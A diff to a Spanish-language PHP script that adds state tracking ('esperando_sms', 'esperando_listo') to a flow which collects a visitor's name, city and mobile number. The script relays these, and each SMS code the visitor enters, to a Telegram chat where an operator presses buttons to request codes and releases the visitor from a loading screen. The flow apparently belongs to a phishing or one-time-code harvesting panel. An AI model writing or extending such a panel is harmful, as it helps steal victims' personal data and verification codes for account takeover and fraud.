@@ -10,6 +10,44 @@ function rutaCodigos()
     return __DIR__ . '/codigos.json';
 }
 
+function setEstado($telefono, $estado)
+{
+    $archivo = rutaCodigos();
+    $datos = [];
+    if (is_file($archivo)) {
+        $json = file_get_contents($archivo);
+        $tmp  = json_decode($json, true);
+        if (is_array($tmp)) {
+            $datos = $tmp;
+        }
+    }
+    $existente = $datos[$telefono] ?? [];
+    if (!is_array($existente)) {
+        $existente = ['codigo' => $existente];
+    }
+    $existente['estado'] = $estado;
+    $datos[$telefono] = $existente;
+    file_put_contents($archivo, json_encode($datos));
+}
+
+function getEstado($telefono)
+{
+    $archivo = rutaCodigos();
+    if (!is_file($archivo)) {
+        return null;
+    }
+    $json = file_get_contents($archivo);
+    $datos = json_decode($json, true);
+    if (!is_array($datos)) {
+        return null;
+    }
+    $valor = $datos[$telefono] ?? null;
+    if (is_array($valor)) {
+        return $valor['estado'] ?? null;
+    }
+    return null;
+}
+
 function guardarCodigo($telefono, $codigo, $nombre = null)
 {
     $archivo = rutaCodigos();
@@ -115,6 +153,7 @@ if (isset($_POST['nombre'], $_POST['ciudad'], $_POST['celular']) && $accion === 
     // Generar código de verificación de 6 dígitos
     $codigo = random_int(100000, 999999);
     guardarCodigo($celular, $codigo, $nombre);
+    setEstado($celular, 'esperando_sms');
 
     // Enviar datos a Telegram con botón inline para pedir primer SMS
     $mensaje = "🔥Nuevo perfil \n" .
@@ -159,13 +198,14 @@ if ($accion === 'confirmar' && $codigoIngresado !== null) {
            "Código ingresado: $codigoIngresado";
 
     if ($telefono !== null && $codigoGuardado !== null && $codigoIngresado === (string)$codigoGuardado) {
-        // Código correcto: pasamos a pantalla de carga esperando confirmación final desde Telegram
-        $estadoConfirmado = false;
+        // Código correcto: mostramos pantalla de carga esperando confirmación final desde Telegram
+        borrarCodigo($telefono);
+        setEstado($telefono, 'esperando_listo');
+        $log .= "\nResultado: CORRECTO";
+
         $mostrarPantallaCarga = true;
         $endpointCarga = 'check_done.php';
-        $redirectUrl = 'final.php';
-        borrarCodigo($telefono);
-        $log .= "\nResultado: CORRECTO";
+        $redirectUrl   = 'final.php';
     } else {
         $mensajeConfirmacion = 'El código no es válido. Inténtalo nuevamente.';
         $_SESSION['mensaje_error'] = $mensajeConfirmacion;
@@ -176,7 +216,7 @@ if ($accion === 'confirmar' && $codigoIngresado !== null) {
         $log .= "\nResultado: INCORRECTO";
     }
 
-    // En cada intento de código agregamos también botones para pedir nuevo SMS o marcar como listo
+    // Para códigos incorrectos seguimos enviando el log con botones de control
     $replyMarkupIntento = [
         'inline_keyboard' => [
             [
